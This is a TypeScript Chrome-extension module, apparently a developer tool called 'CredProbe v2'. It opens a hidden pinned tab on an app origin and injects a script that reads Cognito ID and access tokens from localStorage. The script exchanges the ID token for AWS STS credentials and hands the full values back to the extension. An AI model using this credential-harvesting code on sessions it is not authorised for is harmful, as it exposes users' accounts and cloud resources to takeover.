// credProbeRunner.ts — Run the "CredProbe v2" snippet in a pinned tab on the app origin.
// Executes in MAIN world (same as DevTools console), waits for results, returns them,
// and closes the tab if it was created by us.

type RunCredProbeMsg = {
    type: "credprobe.run";
    originUrl: string;     // e.g., "https://dash.alpha.school/"
    path?: string;         // optional path to ensure hydration, e.g., "/user/list"
    timeoutMs?: number;    // how long to wait for results after injection (default 15s)
};

type CredProbeResult = {
    ok: boolean;
    info?: any;        // window.__AWS_INFO__ (region, userPoolId, identityPoolId, etc.)
    creds?: any;       // window.__AWS_CREDS__ (STS credentials) — SENSITIVE
    idTok?: string;    // window.__ID_TOKEN__  — SENSITIVE
    error?: string;
    debug?: any;
};

async function waitForTabComplete(tabId: number): Promise<void> {
    await new Promise<void>((resolve) => {
        const listener = (tid: number, info: chrome.tabs.TabChangeInfo) => {
            if (tid === tabId && info.status === "complete") {
                chrome.tabs.onUpdated.removeListener(listener);
                resolve();
            }
        };
        chrome.tabs.onUpdated.addListener(listener);
        chrome.tabs.get(tabId, (t) => {
            // @ts-ignore
            if (t && t.status === "complete") {
                chrome.tabs.onUpdated.removeListener(listener);
                resolve();
            }
        });
    });
}

async function openOrReusePinnedTab(originUrl: string, path?: string): Promise<{ tabId: number; created: boolean }> {
    const base = originUrl.replace(/\/+$/, "");
    const targetUrl = base + (path?.startsWith("/") ? path : path ? `/${path}` : "/");
    const pattern = base + "/*";

    const existing = await chrome.tabs.query({ url: pattern });
    if (existing.length) {
        // If we’re not on the target route, navigate there (helps hydration)
        try {
            const u = new URL(existing[0].url || "");
            if (u.origin + u.pathname !== new URL(targetUrl).origin + new URL(targetUrl).pathname) {
                await chrome.tabs.update(existing[0].id!, { url: targetUrl });
                await waitForTabComplete(existing[0].id!);
            }
        } catch {
            /* ignore */
        }
        return { tabId: existing[0].id!, created: false };
    }

    const tab = await chrome.tabs.create({ url: targetUrl, pinned: true, active: false });
    // Reduce discard risk for background-loaded tab
    try { await chrome.tabs.update(tab.id!, { autoDiscardable: false as any }); } catch {}
    await waitForTabComplete(tab.id!);
    return { tabId: tab.id!, created: true };
}

// ---------- Inject the exact snippet in MAIN world and wait for results ----------
async function runCredProbeInTab(tabId: number, timeoutMs = 15000): Promise<CredProbeResult> {
    // We inject a wrapper that runs your CredProbe v2 IIFE verbatim, then polls window.* for results.
    const [{ result } = { result: null }] = await chrome.scripting.executeScript({
        target: { tabId },
        world: "MAIN",
        func: async (injectedTimeoutMs: number) => {
            // ========= BEGIN EXACT "CredProbe v2" SNIPPET =========
            await (async () => {
                const log = (...a) => console.log("%c[CredProbe v2]", "color:#16a34a", ...a);
                const warn = (...a) => console.warn("%c[CredProbe v2]", "color:#b45309", ...a);
                const err = (...a) => console.error("%c[CredProbe v2]", "color:#dc2626", ...a);
                const redact = (s, len = 18) => (s && s.length > len) ? (s.slice(0, 10) + "…" + s.slice(-8)) : s;

                const b64urlToStr = (b) => {
                    b = b.replace(/-/g, '+').replace(/_/g, '/');
                    const pad = b.length % 4;
                    if (pad) b += '='.repeat(4 - pad);
                    return new TextDecoder().decode(Uint8Array.from(atob(b), c => c.charCodeAt(0)));
                };
                const parseJwt = (jwt) => {
                    try {
                        return JSON.parse(b64urlToStr(jwt.split('.')[1] || ''));
                    } catch {
                        return null;
                    }
                };

                const ls = window.localStorage;
                const keys = Array.from({length: ls.length}, (_, i) => ls.key(i));
                const cogKeys = keys.filter(k => k && k.startsWith("CognitoIdentityServiceProvider."));
                let idToken = null, accessToken = null, clientId = null, username = null;

                for (const k of cogKeys) {
                    const val = ls.getItem(k) || "";
                    const parts = k.split(".");
                    if (parts.length < 4) continue;
                    const tokenType = parts[parts.length - 1];
                    const _clientId = parts[1];
                    const _username = parts.slice(2, parts.length - 1).join("."); // keep dots inside email
                    if (tokenType === "idToken") {
                        idToken = val;
                        clientId = _clientId;
                        username = _username;
                    }
                    if (tokenType === "accessToken") {
                        accessToken = val;
                    }
                }

                if (!idToken) {
                    err("No Cognito idToken found in localStorage (v2). Are you on the logged-in app origin?");
                    return;
                }

                const payload = parseJwt(idToken) || {};
                const iss = String(payload.iss || "");
                const m = /cognito-idp\.([a-z0-9-]+)\.amazonaws\.com\/([a-z0-9_-]+)/i.exec(iss);
                const region = m?.[1];
                const userPoolId = m?.[2];
                log("UserPool", {region, userPoolId, clientId, username, idToken: redact(idToken)});

                let identityPoolId = null;
                const idpRe = /\b(?:[a-z]{2}-[a-z-]+-\d):[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}\b/;
                const sameOrigin = (u) => {
                    try {
                        return new URL(u, location.href).origin === location.origin;
                    } catch {
                        return false;
                    }
                };

                try {
                    const el = document.getElementById("__NEXT_DATA__");
                    if (el?.textContent) {
                        const data = JSON.parse(el.textContent);
                        const scan = (obj) => {
                            if (!obj || typeof obj !== "object") return;
                            for (const [k, v] of Object.entries(obj)) {
                                if (identityPoolId) break;
                                if (typeof v === "string") {
                                    const mm = idpRe.exec(v);
                                    if (mm) {
                                        identityPoolId = mm[0];
                                        break;
                                    }
                                } else if (v && typeof v === "object") scan(v);
                            }
                        };
                        scan(data);
                    }
                } catch {
                }

                if (!identityPoolId) {
                    const srcs = [...document.scripts].map(s => s.src).filter(Boolean); // allow cross-origin
                    for (const src of srcs) {
                        try {
                            const txt = await fetch(src, {credentials: "omit"}).then(r => r.ok ? r.text() : "");
                            const mm = idpRe.exec(txt);
                            if (mm) {
                                identityPoolId = mm[0];
                                break;
                            }
                        } catch {
                        }
                    }
                }

                log("IdentityPoolId", identityPoolId);

                if (!identityPoolId) {
                    warn("Identity Pool ID not found automatically. Search Sources for a string like:", `${region}:xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx`);
                    return;
                }

                const provider = `cognito-idp.${region}.amazonaws.com/${userPoolId}`;
                const identityRegion = (identityPoolId || '').split(':')[0] || region;
                const endpoint = `https://cognito-identity.${identityRegion}.amazonaws.com/`;

                async function ci(action, body) {
                    const res = await fetch(endpoint, {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/x-amz-json-1.1",
                            "X-Amz-Target": `AWSCognitoIdentityService.${action}`
                        },
                        body: JSON.stringify(body)
                    });
                    const text = await res.text();
                    if (!res.ok) throw new Error(`${action} ${res.status}: ${text}`);
                    return JSON.parse(text);
                }

                log("GetId…");
                const {IdentityId} = await ci("GetId", {IdentityPoolId: identityPoolId, Logins: {[provider]: idToken}});
                log("IdentityId", IdentityId);

                log("GetCredentialsForIdentity…");
                const {Credentials} = await ci("GetCredentialsForIdentity", {
                    IdentityId,
                    Logins: {[provider]: idToken}
                });

                const summary = {
                    accessKeyId: redact(Credentials.AccessKeyId),
                    secretKey: redact(Credentials.SecretKey),
                    sessionToken: redact(Credentials.SessionToken, 26),
                    expiration: Credentials.Expiration
                };
                log("STS (redacted)", summary);

                Object.assign(window, {
                    __AWS_INFO__: {region, userPoolId, identityPoolId, provider, clientId, username},
                    __AWS_CREDS__: Credentials,
                    __ID_TOKEN__: idToken,
                    __ACCESS_TOKEN__: accessToken
                });
                console.log("%c[CredProbe v2] Full values on window.__AWS_INFO__/__AWS_CREDS__/__ID_TOKEN__", "color:#16a34a");
            })();
            // ========= END EXACT "CredProbe v2" SNIPPET =========

            // Wait for the snippet to populate window.__AWS_CREDS__ (up to injectedTimeoutMs)
            const t0 = Date.now();
            while (Date.now() - t0 < injectedTimeoutMs) {
                // @ts-ignore
                if ((window as any).__AWS_CREDS__) {
                    // @ts-ignore
                    return { ok: true, info: (window as any).__AWS_INFO__ ?? null, creds: (window as any).__AWS_CREDS__, idTok: (window as any).__ID_TOKEN__ ?? null };
                }
                await new Promise(r => setTimeout(r, 200));
            }
            // @ts-ignore
            return { ok: !!(window as any).__AWS_CREDS__, info: (window as any).__AWS_INFO__ ?? null, creds: (window as any).__AWS_CREDS__ ?? null, idTok: (window as any).__ID_TOKEN__ ?? null };
        },
        args: [timeoutMs]
    });

    if (!result || !result.ok) {
        return { ok: false, info: result?.info ?? null, creds: result?.creds ?? null, idTok: result?.idTok ?? null, error: "CredProbe did not produce credentials (timeout or IDP not found)" };
    }
    return result as CredProbeResult;
}

export function installCredProbeRunner() {
    chrome.runtime.onMessage.addListener((msg: any, _sender, sendResponse) => {
        if (!msg || msg.type !== "credprobe.run") return;

        (async () => {
            const m = msg as RunCredProbeMsg;
            let created = false;
            let tabId = -1;
            try {
                const { tabId: id, created: c } = await openOrReusePinnedTab(m.originUrl, m.path || "/user/list");
                tabId = id; created = c;

                const out = await runCredProbeInTab(tabId, m.timeoutMs ?? 15000);
                sendResponse(out);
            } catch (e: any) {
                sendResponse({ ok: false, error: String(e?.message || e) } as CredProbeResult);
            } finally {
                // Close only if we created it and it is inactive
                if (created && tabId > 0) {
                    try {
                        const t = await chrome.tabs.get(tabId);
                        if (t && !t.active) await chrome.tabs.remove(tabId);
                    } catch {}
                }
            }
        })();

        return true; // keep the message channel open
    });
}